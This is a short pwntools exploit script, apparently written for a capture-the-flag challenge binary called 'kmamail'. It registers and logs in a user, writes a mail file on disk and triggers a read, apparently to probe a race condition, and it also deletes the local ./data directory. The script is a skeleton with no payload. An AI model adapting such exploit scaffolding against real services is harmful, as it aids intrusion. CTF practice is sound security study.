from pwn import *
import os, shutil

context.binary = elf = ELF("./kmamail", checksec=False)

gs = r'''
set pagination off
b read_mail
b usleep
continue
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    return process(elf.path)

def mes(io, x):
    io.sendlineafter(b"> ", str(x).encode())

def reg(io, name, pw):
    mes(io, 1)
    io.sendlineafter(b"Username: ", name)
    io.sendlineafter(b"Password: ", pw)

def login(io, name, pw):
    mes(io, 2)
    io.sendlineafter(b"Username: ", name)
    io.sendlineafter(b"Password: ", pw)

def put(path, data):
    open(path, "wb").write(data)

def main():
    if os.path.isdir("./data"):
        shutil.rmtree("./data")

    io = start()

    reg(io, b"huhu", b"racecondition101")
    login(io, b"huhu", b"racecondition101")

    put("./data/huhu/mail", b"0123456789")
    mes(io, 2)

    io.interactive()

if __name__ == "__main__":
    main()
